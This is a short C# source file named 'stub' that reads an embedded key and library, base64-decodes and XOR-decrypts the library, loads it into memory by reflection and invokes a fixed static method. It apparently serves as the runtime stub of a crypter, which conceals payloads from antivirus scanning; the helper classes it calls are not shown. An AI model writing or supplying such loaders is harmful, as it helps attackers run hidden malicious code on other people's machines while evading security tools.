using System;
using System.Reflection;

namespace stub
{
    class @class
    {
        /* What this stub does:
            ---> Gets library key file data
            ---> Get library file data
            ---> Decodes library -> b64
            ---> Decrypts library -> xor
            ---> Loads assembly 
            ---> Invokes { class.void }
        */

        static void Main(string[] args)
        {
            Assembly asm = Assembly.GetExecutingAssembly();

            byte[] key = KeyFile.GetKeyFile(asm);
            byte[] lib = GetLib.GetExe(asm);

            xor(lib, key);

            asm = Assembly.Load(lib);

            Type t = asm.GetType("A.class1");

            t.InvokeMember("method1", BindingFlags.InvokeMethod | BindingFlags.Static | BindingFlags.Public, null, null, null);
        }


        static void xor(byte[] input, byte[] key)
        {
            for (int i = 0; i < input.Length; i++)
                input[i] ^= key[i % key.Length];
        }

    }
}
